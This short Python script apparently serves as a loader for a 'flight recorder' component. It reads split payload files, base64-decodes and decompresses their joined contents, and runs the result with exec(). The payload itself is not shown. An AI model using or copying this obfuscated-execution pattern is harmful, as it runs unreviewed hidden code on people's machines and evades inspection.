from base64 import b64decode
from pathlib import Path
from zlib import decompress

parts = sorted(Path(__file__).parent.glob("farol_flight_recorder_0163.payload.*"))
if not parts:
    raise SystemExit("payload do gravador de voo nao encontrado")
payload = "".join(part.read_text(encoding="utf-8").strip() for part in parts)
exec(compile(decompress(b64decode(payload)), __file__, "exec"))
